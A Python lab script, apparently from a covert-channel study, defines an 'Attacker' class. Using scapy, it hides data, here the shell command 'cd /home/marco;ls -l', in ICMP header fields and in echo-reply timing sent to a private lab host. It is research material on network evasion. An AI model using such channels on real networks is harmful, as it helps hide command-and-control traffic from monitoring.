import sys
import os

file_path = "../comunication_methods.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import comunication_methods as com

file_path = "../mymethods.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import mymethods 

#from scapy.all import * 
from scapy.all import IP, ICMP, sr1, Raw
import datetime 
import time

class Attacker:
    def __init__(self):
        data="Hello_World".encode()
        data="cd /home/marco;ls -l".encode()
        ip_dst="192.168.56.102"
        
        #self.send_information_reply(data, ip_dst) 
        #self.send_timestamp_reply(data, ip_dst) 
        #self.send_redirect(data, ip_dst) 
        #self.send_source_quench(data, ip_dst) 
        #self.send_parameter_problem(data, ip_dst) 
        #self.send_time_exceeded(data, ip_dst) 
        #self.send_destination_unreachable(data, ip_dst)
        # Equazione retta Timing CC y=1.17667x^{2}-4.66x+11.81333
        #self.send_timing_channel_1bit(data, ip_dst) 
        self.send_timing_channel_2bit(data, ip_dst) 
        #TROPPO TEMPO self.send_timing_channel_4bit(data, ip_dst) 

    def send_information_reply(self,data:bytes=None,ip_dst=None):
        TYPE_INFORMATION_REQUEST=15
        TYPE_INFORMATION_REPLY=16
        try:
            com.is_valid_ipaddress_v4(ip_dst)
            com.is_bytes(data) 
        except Exception as e:
            raise Exception(f"information_type: {e}") 
        print(data)
        for index in range(0, len(data), 2): 
            if index==len(data)-1 and len(data)%2!=0:
                icmp_id=(data[index]<<8)
            else:
                icmp_id=(data[index]<<8)+data[index+1]
            print(data[index],chr(data[index]),type(data[index])) 
            print(data[index+1],chr(data[index+1]),type(data[index+1]))  
            print(icmp_id, type(icmp_id), sys.getsizeof(icmp_id))
            print(f"{data[index]} {data[index+1]} => icmp_id: {icmp_id}")
            pkt= IP(dst=ip_dst)/ICMP(type=TYPE_INFORMATION_REPLY,id=icmp_id)
            print(f"Sending {pkt.summary()}") 
            ans = sr1(pkt, timeout=10, verbose=1) 
            if ans: 
                print(ans.show())
                #return True  
            #return False
        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_INFORMATION_REPLY,id=0,seq=1)
        print(f"Sending {pkt.summary()}") 
        ans = sr1(pkt, timeout=10, verbose=1) 
        if ans: 
            print(ans.show())
            return True  
        return False 
    
    def send_timestamp_reply(self,data:bytes=None,ip_dst=None):
        TYPE_TIMESTAMP_REQUEST=13 
        TYPE_TIMESTAMP_REPLY=14
        try:
            com.is_valid_ipaddress_v4(ip_dst)
            com.is_bytes(data) 
        except Exception as e:
            raise Exception(f"information_type: {e}") 
        print(data) 
        for index in range(0, len(data), 5): 
            icmp_id=icmp_id=(data[index]<<8)+data[index+1] 
            print(data[index],type(data[index])) 
            print(data[index+1],type(data[index+1]))   
            
            current_time=datetime.datetime.now(datetime.timezone.utc) 
            midnight = current_time.replace(hour=0, minute=0, second=0, microsecond=0)
            print("current_time",current_time)
            print("midnight",midnight)

            data_pkt=int.from_bytes(data[index+2:index+3])  *10**3
            current_time=current_time.replace(microsecond=data_pkt)
            icmp_ts_ori=int((current_time - midnight).total_seconds() * 1000)
            print("data_pkt", data_pkt)
            print("data_pkt", data_pkt/10**3)
            print("chr",chr(int(data_pkt/10**3)))
            print("current_time",current_time)  
            print("icmp_ts_ori", icmp_ts_ori ,type(icmp_ts_ori))
            #icmp_ts_ori= int.from_bytes(data[index+2:index+5])  #(ms_since_midnight << 24) |  

            data_pkt=int.from_bytes(data[index+3:index+4]) *10**3
            if current_time.second+1<60:
                current_time=current_time.replace(second=current_time.second+1, microsecond=data_pkt)
            else:
                current_time=current_time.replace(minute=current_time.minute+1,second=(current_time.second+1)%60, microsecond=data_pkt)
            icmp_ts_rx=int((current_time - midnight).total_seconds() * 1000)
            print("data_pkt", data_pkt/10**3)
            print("chr",chr(int(data_pkt/10**3)))
            print("current_time",current_time) 
            print("icmp_ts_rx", icmp_ts_rx ,type(icmp_ts_rx))
            
            data_pkt=int.from_bytes(data[index+4:index+5]) *10**3
            if current_time.second+1<60:
                current_time=current_time.replace(second=current_time.second+1, microsecond=data_pkt)
            else:
                current_time=current_time.replace(minute=current_time.minute+1,second=(current_time.second+1)%60, microsecond=data_pkt)
            icmp_ts_tx=int((current_time - midnight).total_seconds() * 1000)
            print("data_pkt", data_pkt/10**3) 
            print("chr",chr(int(data_pkt/10**3)))
            print("current_time",current_time) 
            print("icmp_ts_tx", icmp_ts_tx ,type(icmp_ts_tx))
            
            print("aaa",current_time - midnight)
            print("aaa",(current_time - midnight).total_seconds())
            print("aaa",(current_time - midnight).total_seconds()*1000)
            print("aaa",int((current_time - midnight).total_seconds() * 1000))
            pkt= IP(dst=ip_dst)/ICMP(
                type=TYPE_TIMESTAMP_REPLY
                ,id=icmp_id
                ,ts_ori=icmp_ts_ori
                ,ts_rx=icmp_ts_rx
                ,ts_tx=icmp_ts_tx
            )
            print(f"Sending {pkt.summary()}") 
            ans = sr1(pkt, timeout=10, verbose=1) 
            if ans: 
                print(ans.show())
                #return True  
            #return False 
        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_TIMESTAMP_REPLY,id=0,seq=1)
        print(f"Sending {pkt.summary()}") 
        ans = sr1(pkt, timeout=10, verbose=1) 
        if ans: 
            print(ans.show())
            return True  
        return False 
    
    def send_redirect(self,data:bytes=None,ip_dst=None):
        TYPE_REDIRECT=5  
        try:
            com.is_valid_ipaddress_v4(ip_dst)
            com.is_bytes(data) 
        except Exception as e:
            raise Exception(f"information_type: {e}") 
        print(data)  
        for index in range(0, len(data), 4): 
            #icmp_id=(data[index]<<8)+data[index+1]
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", len=int.from_bytes(data[index:index+2])) / \
                ICMP(id=int.from_bytes(data[index+2:index+4]))
            pkt= IP(dst=ip_dst)/ICMP(type=TYPE_REDIRECT)/Raw(load=dummy_ip)
            print(f"Sending {pkt.summary()}") 
            ans = sr1(pkt, timeout=10, verbose=1) 
        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8") / ICMP(id=0,seq=1)
        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_REDIRECT)/Raw(load=dummy_ip)
        print(f"Sending {pkt.summary()}") 
        ans = sr1(pkt, timeout=10, verbose=1) 
        if ans: 
            print(ans.show())
            return True  
        return False 
    
    def send_source_quench(self,data:bytes=None,ip_dst=None):
        TYPE_SOURCE_QUENCH=4  
        try:
            com.is_valid_ipaddress_v4(ip_dst)
            com.is_bytes(data) 
        except Exception as e:
            raise Exception(f"information_type: {e}") 
        print(data)  
        for index in range(0, len(data), 8):
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", len=int.from_bytes(data[index+4:index+6])) / \
                ICMP(id=int.from_bytes(data[index+6:index+8]))
            pkt= IP(dst=ip_dst)/\
                ICMP(type=TYPE_SOURCE_QUENCH, unused=int.from_bytes(data[index:index+4]))/\
                Raw(load=dummy_ip)
            print(f"Sending {pkt.summary()}") 
            ans = sr1(pkt, timeout=10, verbose=1) 
        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8") / ICMP(id=0,seq=1)
        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_SOURCE_QUENCH)#/Raw(load=dummy_ip)
        print(f"Sending {pkt.summary()}") 
        ans = sr1(pkt, timeout=10, verbose=1) 
        if ans: 
            print(ans.show())
            return True  
        return False 
    
    def send_parameter_problem(self,data:bytes=None,ip_dst=None):
        TYPE_PARAMETER_PROBLEM=12  
        try:
            com.is_valid_ipaddress_v4(ip_dst)
            com.is_bytes(data) 
        except Exception as e:
            raise Exception(f"information_type: {e}") 
        print(data)  
        for index in range(0, len(data), 7):
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", len=int.from_bytes(data[index+3:index+5])) / \
                ICMP(id=int.from_bytes(data[index+5:index+7]))
            pkt= IP(dst=ip_dst)/\
                ICMP(type=TYPE_PARAMETER_PROBLEM, ptr=int(data[index]) ,unused=int.from_bytes(data[index+1:index+3]) )/\
                Raw(load=dummy_ip)
            print(f"Sending {pkt.summary()}") 
            ans = sr1(pkt, timeout=10, verbose=1) 
        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8") / ICMP(id=0,seq=1)
        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_PARAMETER_PROBLEM)/Raw(load=dummy_ip)
        print(f"Sending {pkt.summary()}") 
        ans = sr1(pkt, timeout=10, verbose=1) 
        if ans: 
            print(ans.show())
            return True  
        return False 
    
    def send_time_exceeded(self,data:bytes=None,ip_dst=None):
        TYPE_TIME_EXCEEDED=11  
        try:
            com.is_valid_ipaddress_v4(ip_dst)
            com.is_bytes(data) 
        except Exception as e:
            raise Exception(f"information_type: {e}") 
        print(data)  
        for index in range(0, len(data), 6):
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", len=int.from_bytes(data[index+2:index+4])) / \
                ICMP(id=int.from_bytes(data[index+4:index+6]))
            pkt= IP(dst=ip_dst)/\
                ICMP(type=TYPE_TIME_EXCEEDED, unused=int.from_bytes(data[index:index+2]) )/\
                Raw(load=dummy_ip)
            print(f"Sending {pkt.summary()}") 
            ans = sr1(pkt, timeout=10, verbose=1) 
        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8") / ICMP(id=0,seq=1)
        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_TIME_EXCEEDED)/Raw(load=dummy_ip)
        print(f"Sending {pkt.summary()}") 
        ans = sr1(pkt, timeout=10, verbose=1) 
        if ans: 
            print(ans.show())
            return True  
        return False  
    
    def send_destination_unreachable(self,data:bytes=None,ip_dst=None):
        TYPE_DESTINATION_UNREACHABLE=3  
        try:
            com.is_valid_ipaddress_v4(ip_dst)
            com.is_bytes(data) 
        except Exception as e:
            raise Exception(f"information_type: {e}") 
        print(data)  
        for index in range(0, len(data), 8):
            dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8", len=int.from_bytes(data[index+4:index+6])) / \
                ICMP(id=int.from_bytes(data[index+6:index+8]))
            pkt= IP(dst=ip_dst)/\
                ICMP(type=TYPE_DESTINATION_UNREACHABLE, unused=int.from_bytes(data[index:index+4]) )/\
                Raw(load=dummy_ip)
            print(f"Sending {pkt.summary()}") 
            ans = sr1(pkt, timeout=10, verbose=1) 
        dummy_ip=IP(src="192.168.1.10", dst="8.8.8.8") / ICMP(id=0,seq=1)
        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_DESTINATION_UNREACHABLE)/Raw(load=dummy_ip)
        print(f"Sending {pkt.summary()}") 
        ans = sr1(pkt, timeout=10, verbose=1) 
        if ans: 
            print(ans.show())
            return True  
        return False  
    
    def send_timing_channel_1bit(self,data:bytes=None,ip_dst=None): #Exec Time 0:08:33.962674
        #Nella comunicazione possono verificarsi turbolenze. 
        #Per poter distinguere i due tempi la distanza deve essere adeguata. 
        #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore
        TEMPO_0=3 #sec
        DISTANZA_TEMPI=2 #sec
        TEMPO_1=8 #sec
        if TEMPO_0+DISTANZA_TEMPI*2>=TEMPO_1: 
            raise ValueError("send_timing_cc: TEMPO_1 non valido")
        TEMPO_BYTE=0*60 #minuti
        
        TYPE_ECHO_REQUEST=8
        TYPE_ECHO_REPLY=0
        midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)
        try:
            com.is_valid_ipaddress_v4(ip_dst)
            com.is_bytes(data) 
        except Exception as e:
            raise Exception(f"information_type: {e}") 
        print(data)  
        bit_data=[]
        for piece_data in data: #BIG ENDIAN
            bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
            #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
            bit_piece_data=[(piece_data >> index) & 1 for index in range(8)]
            print(chr(piece_data),piece_data, bit_piece_data) 
        print(bit_data)
        start_time=datetime.datetime.now(datetime.timezone.utc) 
        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
        print(f"Sending {pkt.summary()}") 
        ans = sr1(pkt, timeout=0, verbose=1) 
        for piece_bit_data in bit_data:
            for bit in piece_bit_data:
                if bit: 
                    time.sleep(TEMPO_1) 
                else: 
                    time.sleep(TEMPO_0)
                current_time=datetime.datetime.now(datetime.timezone.utc)
                pkt= IP(dst=ip_dst)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
                print(f"Sending {pkt.summary()}")
                ans = sr1(pkt, timeout=0, verbose=1) 
            time.sleep(TEMPO_BYTE)
        end_time=datetime.datetime.now(datetime.timezone.utc)
        #print("Exec Time",int((end_time-start_time).total_seconds() * 1000))
        print("Exec Time", str(end_time-start_time))
    
    def send_timing_channel_2bit(self,data:bytes=None,ip_dst=None): #Exec Time 0:07:20.978946
        #Nella comunicazione possono verificarsi turbolenze. 
        #Per poter distinguere i due tempi la distanza deve essere adeguata. 
        #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore
        DISTANZA_TEMPI=2 #sec
        TEMPI_CODICI=[3+index*2*DISTANZA_TEMPI for index in range(2**2)] #00, 01, 10, 11
        #TEMPO_00=3, TEMPO_01=TEMPO_00+2*DISTANZA_TEMPI, TEMPO_10=TEMPO_01+2*DISTANZA_TEMPI, TEMPO_11=TEMPO_10+2*DISTANZA_TEMPI
        TEMPO_BYTE=0*60 #minuti  
        print(TEMPI_CODICI)
        
        TYPE_ECHO_REQUEST=8
        TYPE_ECHO_REPLY=0
        midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)
        try:
            com.is_valid_ipaddress_v4(ip_dst)
            com.is_bytes(data) 
        except Exception as e:
            raise Exception(f"information_type: {e}") 
        print(data)  
        bit_data=[]
        for piece_data in data: #BIG ENDIAN
            bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
            #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
            bit_piece_data=[(piece_data >> index) & 1 for index in range(8)]
            print(chr(piece_data),piece_data, bit_piece_data)  
        start_time=datetime.datetime.now(datetime.timezone.utc)
        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
        print(f"Sending {pkt.summary()}") 
        ans = sr1(pkt, timeout=0, verbose=1) 
        for piece_bit_data in bit_data:
            for bit1, bit2 in zip(piece_bit_data[0::2], piece_bit_data[1::2]):
                #print(bit1,bit2,"|", (bit1<<1)+bit2,"|", TEMPI_CODICI[(bit1<<1)+bit2])  
                time.sleep(TEMPI_CODICI[(bit1<<1)+bit2]) 
                current_time=datetime.datetime.now(datetime.timezone.utc)
                pkt= IP(dst=ip_dst)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
                print(f"Sending {pkt.summary()}")
                ans = sr1(pkt, timeout=0, verbose=1) 
            print("Byte")
            time.sleep(TEMPO_BYTE)
        end_time=datetime.datetime.now(datetime.timezone.utc)
        #print("Exec Time",int((end_time-start_time).total_seconds() * 1000))
        print("Exec Time", str(end_time-start_time))
    
    def send_timing_channel_4bit(self,data:bytes=None,ip_dst=None): #Exec Time 0:12:00.745110 
        #Nella comunicazione possono verificarsi turbolenze. 
        #Per poter distinguere i due tempi la distanza deve essere adeguata. 
        #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore
        DISTANZA_TEMPI=2 #sec
        TEMPI_CODICI=[3+index*2*DISTANZA_TEMPI for index in range(4**2)] #0000, 0001, 0010, 0011,...,1111
        TEMPO_BYTE=0*60 #minuti  
        print(TEMPI_CODICI)
        
        TYPE_ECHO_REQUEST=8
        TYPE_ECHO_REPLY=0
        midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)
        try:
            com.is_valid_ipaddress_v4(ip_dst)
            com.is_bytes(data) 
        except Exception as e:
            raise Exception(f"information_type: {e}") 
        print(data)  
        bit_data=[]
        for piece_data in data: #BIG ENDIAN
            bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
            #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
            bit_piece_data=[(piece_data >> index) & 1 for index in range(8)]
            print(chr(piece_data),piece_data, bit_piece_data)  
        start_time=datetime.datetime.now(datetime.timezone.utc)
        pkt= IP(dst=ip_dst)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
        print(f"Sending {pkt.summary()}") 
        ans = sr1(pkt, timeout=0, verbose=1) 
        print("Length", len(data),len(bit_data))
        for piece_bit_data in bit_data:
            for bit1, bit2,bit3,bit4 in zip(piece_bit_data[0::4], piece_bit_data[1::4],piece_bit_data[2::4], piece_bit_data[3::4]):
                index=bit1<<3 | bit2<<2 |  bit3<<1 | bit4 
                print(bit1, bit2,bit3,bit4,"|", index,"|", TEMPI_CODICI[index])  
                time.sleep(TEMPI_CODICI[index])  
                pkt= IP(dst=ip_dst)/ICMP(type=TYPE_ECHO_REPLY)/Raw()
                print(f"Sending {pkt.summary()}")
                ans = sr1(pkt, timeout=0, verbose=1) 
            print("Byte")
            time.sleep(TEMPO_BYTE)
        end_time=datetime.datetime.now(datetime.timezone.utc)
        #print("Exec Time",int((end_time-start_time).total_seconds() * 1000))
        print("Exec Time", str(end_time-start_time))
    
    def send_timing_channel_8bit(self,data:bytes=None,ip_dst=None):
        raise Exception("Tempo di esecuzione stimato: 50 minuti per inviare 11 byte")
    
if __name__=="__main__":
    print("Ciao")
    attacker=Attacker()